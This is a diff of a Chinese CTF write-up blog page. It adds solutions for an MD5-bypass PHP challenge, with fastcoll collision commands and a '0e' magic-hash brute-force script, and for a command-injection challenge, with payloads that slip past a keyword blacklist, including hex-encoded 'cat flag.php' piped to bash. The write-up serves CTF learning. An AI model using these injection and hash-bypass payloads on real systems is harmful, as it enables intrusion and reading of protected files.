@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2020-02-28</span>
-            <span class="time">06:38:51</span>
+            <span class="time">20:13:08</span>
           </span>
           
         </div>
@@ -135,6 +135,99 @@
 <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span>;//需要跑好久</code></pre>
 
 <p>账号admin 密码跑出来就可</p>
+<h1 id="easy-hash"><a href="#easy-hash" class="headerlink" title="easy-hash"></a>easy-hash</h1><p>这题是md5绕过三次绕过</p>
+<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span>
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);
+$str1 = @$_GET[<span class="hljs-string">'str1'</span>];
+$str2 = @$_GET[<span class="hljs-string">'str2'</span>];
+$str3 = @$_GET[<span class="hljs-string">'str3'</span>];
+$str4 = @$_GET[<span class="hljs-string">'str4'</span>];
+$str5 = (string)@$_POST[<span class="hljs-string">'str5'</span>];
+$str6 = (string)@$_POST[<span class="hljs-string">'str6'</span>];
+$str7 = (string)@$_POST[<span class="hljs-string">'str7'</span>];
+<span class="hljs-keyword">if</span>( $str1 == $str2 )&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'str1 OR Sstr2 no no no'</span>);
+&#125;
+<span class="hljs-keyword">if</span>( md5($str1) != md5($str2) )&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'step 1 fail'</span>);
+&#125;
+<span class="hljs-keyword">if</span>( $str3 == $str4 )&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'str3 OR str4 no no no'</span>);
+&#125;
+<span class="hljs-keyword">if</span> ( md5($str3) !== md5($str4))&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'step 2 fail'</span>);
+&#125;
+<span class="hljs-keyword">if</span>( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'str5 OR str6 OR str7 no no no'</span>);
+&#125;
+<span class="hljs-keyword">if</span> (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'step 3 fail'</span>);
+&#125;
+
+<span class="hljs-keyword">if</span>(!($_POST[<span class="hljs-string">'a'</span>]) <span class="hljs-keyword">and</span> !($_POST[<span class="hljs-string">'b'</span>]))
+&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"come on!"</span>;
+    <span class="hljs-keyword">die</span>();
+&#125;
+$a = $_POST[<span class="hljs-string">'a'</span>];
+$b = $_POST[<span class="hljs-string">'b'</span>];
+$m = $_GET[<span class="hljs-string">'m'</span>];
+$n = $_GET[<span class="hljs-string">'n'</span>];
+
+<span class="hljs-keyword">if</span> (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; <span class="hljs-number">6</span>)) 
+&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"a OR b fail!"</span>;
+    <span class="hljs-keyword">die</span>();
+&#125;</span></code></pre>
+
+<p>判断的源码类似这种,想绕过(string)$<code>_</code>POST这种需要绕过<br>str5 str6 str7，首先第一个肯定不能三个相等，但是下面又用严格的判断必须md5相等，在php中===和!==这种几乎是没办法绕过的，所以只能让他们的md5真正相等，如果一开始就去绕可能就陷进去了，这个判断的难点在于找到三个真正相等的MD5值的原型。</p>
+<pre><code class="hljs undefined">D:\fastcoll&gt;fastcoll_v1.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5</span>.exe -o <span class="hljs-keyword">jlzj0 </span><span class="hljs-keyword">jlzj1 </span>     <span class="hljs-comment">#-o参数代表随机生成两个相同MD5的文件</span>
+D:\fastcoll&gt;fastcoll_v1.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5</span>.exe -p <span class="hljs-keyword">jlzj1 </span>-o <span class="hljs-keyword">jlzj00 </span><span class="hljs-keyword">jlzj01 </span> <span class="hljs-comment">#-p参数代表根据jlzj1文件随机生成两个相同MD5的文件，注意：生成的MD5与jlzj1不同</span>
+D:\fastcoll&gt;tail.exe -c <span class="hljs-number">128</span> <span class="hljs-keyword">jlzj00 </span>&gt; a                <span class="hljs-comment">#-c 128代表将jlzj00的最后128位写入文件a，这128位正是jlzj1与jlzj00的MD5不同的原因</span>
+D:\fastcoll&gt;tail.exe -c <span class="hljs-number">128</span> <span class="hljs-keyword">jlzj01 </span>&gt; <span class="hljs-keyword">b </span>               <span class="hljs-comment">#同理</span>
+D:\fastcoll&gt;type <span class="hljs-keyword">jlzj0 </span>a &gt; <span class="hljs-keyword">jlzj10 </span>                   <span class="hljs-comment">#这里表示将jlzj0和a文件的内容合并写入jlzj10</span>
+D:\fastcoll&gt;type <span class="hljs-keyword">jlzj0 </span><span class="hljs-keyword">b </span>&gt; <span class="hljs-keyword">jlzj11 </span>                   <span class="hljs-comment">#同理写入jlzj11</span></code></pre>
+
+<p>直接上办法 生成四个相同的文件,之后一定要url编码<br>下来介绍一下如何绕过<br><code>$val9 = strtr(md5($b), $m, $n);</code><br>原题中是要比较val9和val8 md5是否相等 ==弱比较<br>只要都是0e 但是val9可以替换一个字符<br>我们写脚本</p>
+<pre><code class="hljs undefined">import hashlib
+def findA():
+	alphabet = <span class="hljs-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'</span>
+	<span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">in</span> alphabet:
+		<span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> alphabet:
+			<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> alphabet:
+				<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> alphabet:
+					<span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> alphabet:
+						payload = (<span class="hljs-keyword">a</span>+b+c+d+e).encode()
+						md5 = hashlib.md5(payload)
+						<span class="hljs-built_in">value</span> = md5.hexdigest()
+						pre = <span class="hljs-built_in">value</span>[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]
+						<span class="hljs-keyword">last</span> = <span class="hljs-built_in">value</span>[<span class="hljs-number">2</span>:<span class="hljs-number">32</span>]
+						<span class="hljs-keyword">if</span> pre == <span class="hljs-string">'0e'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">last</span>.isdigit():
+							print(<span class="hljs-string">'successful A found!! &#123;&#125; \'s md5=&#123;&#125;'</span>.<span class="hljs-built_in">format</span>(payload, <span class="hljs-built_in">value</span>))
+							<span class="hljs-literal">return</span>
+def findB():
+	alphabet = <span class="hljs-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'</span>
+	<span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">in</span> alphabet:
+		<span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> alphabet:
+			<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> alphabet:
+				<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> alphabet:
+					<span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> alphabet:
+						payload = (<span class="hljs-keyword">a</span>+b+c+d+e).encode()
+						md5 = hashlib.md5(payload)
+						<span class="hljs-built_in">value</span> = md5.hexdigest()
+						pre = <span class="hljs-built_in">value</span>[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>]
+						<span class="hljs-keyword">last</span> = <span class="hljs-built_in">value</span>[<span class="hljs-number">2</span>:<span class="hljs-number">32</span>]
+						<span class="hljs-keyword">if</span>  pre == <span class="hljs-string">'e'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">last</span>.isdigit():
+							print(<span class="hljs-string">'successful B found! &#123;&#125; \'s md5=&#123;&#125;'</span>.<span class="hljs-built_in">format</span>(payload, <span class="hljs-built_in">value</span>))
+							<span class="hljs-literal">return</span>
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+	findA()
+	findB()</code></pre>
+
+<p>如果我们找到的b是7e 那么我们就可以 m=7 n=0<br>那么字符串就变成了 0e</p>
+<h1 id="commix"><a href="#commix" class="headerlink" title="commix"></a>commix</h1><p>这题就是一个命令执行的题,比赛的时候被打穿了,黑名单如下,我们利用其他的命令<br><code>$blacklist=&quot;cat|\/|cd|flag|curl|{|\(|&#39;|\&quot;|echo|\\\\|&amp;|grep|base64&quot;;</code><br>a=cho;e$a 63617420666C61672E706870|xxd -r -p|bash (63617420666C61672E706870是cat flag.php的hex)<br>a=at;c$a <code>ls</code> (命令拼接)<br>a=at;b=ag;c$a fl$b.php<br>a=at;c$a fl*<br>a=at;c$a fl[abc]g.php<br>之前打的北工大的比赛就有这样的题</p>
 
         </div>
       </div>
